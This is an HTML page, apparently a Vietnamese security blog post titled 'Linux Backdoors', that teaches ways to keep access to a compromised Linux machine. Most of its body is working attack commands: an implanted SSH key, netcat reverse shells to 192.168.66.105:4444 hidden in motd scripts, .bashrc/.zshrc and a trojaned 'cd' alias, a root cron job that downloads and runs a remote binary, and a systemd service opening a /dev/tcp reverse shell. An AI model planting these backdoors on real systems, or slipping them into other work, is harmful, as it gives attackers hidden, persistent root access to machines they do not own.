@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Backdoors - quactv</title><meta name="Description" content="quactv blog"><meta property="og:title" content="Linux Backdoors" />
+<meta property="og:description" content="Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tranquac.github.io/posts/linux-backdoors/" /><meta property="og:image" content="https://tranquac.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-28T18:17:00&#43;07:00" />
+<meta property="article:modified_time" content="2021-06-28T18:17:00&#43;07:00" /><meta property="og:site_name" content="quactv blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://tranquac.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Linux Backdoors"/>
+<meta name="twitter:description" content="Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng."/>
+<meta name="application-name" content="quactv blog">
+<meta name="apple-mobile-web-app-title" content="quactv blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://tranquac.github.io/posts/linux-backdoors/" /><link rel="prev" href="https://tranquac.github.io/posts/sql/" /><link rel="next" href="https://tranquac.github.io/posts/androi-pentest-note-p1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Backdoors",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/tranquac.github.io\/posts\/linux-backdoors\/"
+        },"genre": "posts","keywords": "Linux","wordcount":  627 ,
+        "url": "https:\/\/tranquac.github.io\/posts\/linux-backdoors\/","datePublished": "2021-06-28T18:17:00+07:00","dateModified": "2021-06-28T18:17:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "quactv"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="quactv">&gt; root@quactv:~#</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/write-up/"> Write-up </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="quactv">&gt; root@quactv:~#</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/write-up/" title="">Write-up</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Backdoors</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>quactv</a></span>&nbsp;<span class="post-category">included in <a href="/categories/offensive-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Offensive Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-06-28">2021-06-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;627 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#backdoor-là-gì">Backdoor là gì?</a></li>
+        <li><a href="#1-ssh-keys">1. SSH Keys</a></li>
+        <li><a href="#2-ssh-motd">2. SSH motd</a></li>
+        <li><a href="#3-users-bashrc--interactive-session">3. User’s .bashrc — Interactive session</a></li>
+        <li><a href="#4-users-bashrc--aliases">4. User’s .bashrc — Aliases</a></li>
+        <li><a href="#5-cron-jobs">5. Cron jobs</a></li>
+        <li><a href="#6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng. Ở đây chúng ta chỉ thảo luận trong thế giới Linux!</p>
+<h3 id="backdoor-là-gì">Backdoor là gì?</h3>
+<p>Backdoor là một đoạn mã ẩn, script hay chương trình đặt trên máy mục tiêu phục vụ cho mục đích truy cập dài hạn vào mục tiêu của kẻ tấn công,với điều đó bạn không phải khai thác cùng một hệ thống hai lần. Nó chỉ đơn giản là cung cấp cho bạn quyền truy cập nhanh hơn và tức thì vào hệ thống.</p>
+<h3 id="1-ssh-keys">1. SSH Keys</h3>
+<p>SSH authorized_keys tập tin chứa một danh sách các ủy quyền người dùng / khóa công khai được phép đăng nhập vào một tài khoản cụ thể. Trong tệp này, những kẻ tấn công cũng có thể đặt các khóa công khai của chúng để tự cấp quyền và truy cập ngay vào hệ thống thông qua SSH.\</p>
+<h4 id="victim">Victim</h4>
+<p><code>ssh-keygen -t rsa</code><br>
+-&gt; generate key pair<br>
+<code>cat /$(whoami)/.ssh/id_rsa.pub &gt; /$(whoami)/.ssh/authorized_keys</code><br>
+-&gt; copy public key (id_rsa.pub) to authorized_keys</p>
+<h4 id="attacker">Attacker</h4>
+<p>Copy private key (id_rsa)<br>
+<code>chmod 600 id_rsa</code><br>
+-&gt; set permission<br>
+<code>ssh -i id_rsa username@victim</code><br>
+-&gt; ssh to victim<br>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG" /></p>
+<h3 id="2-ssh-motd">2. SSH motd</h3>
+<p>motd (Tin nhắn trong ngày) là banner xuất hiện khi bạn đăng nhập vào máy bằng SSH. Đối với Ubuntu / Debian các tập lệnh motd có thể được tìm thấy tại /etc/update-motd.d. Theo mặc định, những người dùng khác không có quyền ghi trên thư mục đó.
+<code>cd /etc/update-motd.d &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor</code><br>
+Lưu ý: &amp; -&gt; run command in background
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG" /></p>
+<h3 id="3-users-bashrc--interactive-session">3. User’s .bashrc — Interactive session</h3>
+<p>.bashrc là một trong những tập lệnh khởi động được sử dụng bởi Bourne shell bash (zsh là .zshrc). Nếu có người dùng sử dụng bashlàm trình bao đăng nhập của họ, thì tập lệnh sẽ được thực thi cho mỗi phiên tương tác mà họ khởi chạy.<br>
+<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .bashrc</code><br>
+<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .zshrc</code><br>
+sẽ nhận được reverse shell khi người dùng sử dụng lệnh <code>bash</code> hay <code>su username</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG" /></p>
+<h3 id="4-users-bashrc--aliases">4. User’s .bashrc — Aliases</h3>
+<p>Là một kẻ tấn công, chúng ta cũng có thể đặt backdoor trong bí danh của người dùng! Đây cũng là 1 phương pháp tôi rất thích.<br>
+<code>alias cd='$(nc 192.168.66.105 4444 -e /bin/bash &amp;); cd'</code><br>
+-&gt; Chúng ta sẽ nhận được reverse shell mỗi khi người dùng sử dụng lệnh cd
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG" />
+Dưới đây là một số backdoor phức tạp khác sử dụng bí danh:</p>
+<ul>
+<li><a href="https://github.com/nisay759/sudo-backdoor" target="_blank" rel="noopener noreffer ">https://github.com/nisay759/sudo-backdoor</a></li>
+<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb" target="_blank" rel="noopener noreffer ">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
+</ul>
+<h3 id="5-cron-jobs">5. Cron jobs</h3>
+<p>Cron là một tính năng từ OS like Linux / UNIX có thể được sử dụng để thực hiện định kỳ một công việc hoặc nhiệm vụ cụ thể giống như Task Scheduler trong Windows.<br>
+<code>echo '* * * * * root cd /tmp; wget 192.168.66.105:8000/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor' &gt; /etc/cron.d/backdoor</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG" /></p>
+<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
+<p>Kẻ tấn công cũng có thể tạo một backdoor như một service (BaaS). Đây là một ví dụ về BaaS ( backdoor.service):</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>Service<span class="o">]</span>
+<span class="nv">Type</span><span class="o">=</span>simple
+<span class="nv">User</span><span class="o">=</span>root
+<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.66.105/4444 0&gt;&amp;1&#34;</span>
+<span class="o">[</span>Install<span class="o">]</span>
+<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+</code></pre></div><p>Khi service được bắt đầu, nó khởi chạy một reverse shell cho kẻ tấn công.<br>
+<code>cd /etc/systemd/system &amp;&amp; systemctl start backdoor.service</code><br>
+Nó cũng có thể được kích hoạt khi enable.<br>
+<code>cd /etc/systemd/system &amp;&amp; systemctl enable backdoor.service</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-06-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://tranquac.github.io/posts/linux-backdoors/" data-title="Linux Backdoors" data-via="quactv1" data-hashtags="Linux"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://tranquac.github.io/posts/linux-backdoors/" data-hashtag="Linux"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://tranquac.github.io/posts/linux-backdoors/" data-title="Linux Backdoors"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://tranquac.github.io/posts/linux-backdoors/" data-title="Linux Backdoors"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://tranquac.github.io/posts/linux-backdoors/" data-title="Linux Backdoors"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/linux/">Linux</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/sql/" class="prev" rel="prev" title="SQL"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>SQL</a>
+            <a href="/posts/androi-pentest-note-p1/" class="next" rel="next" title="Android Pentest Note">Android Pentest Note<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">quactv</a></span>&nbsp;|&nbsp;<span class="license">Infosec</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">Security</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
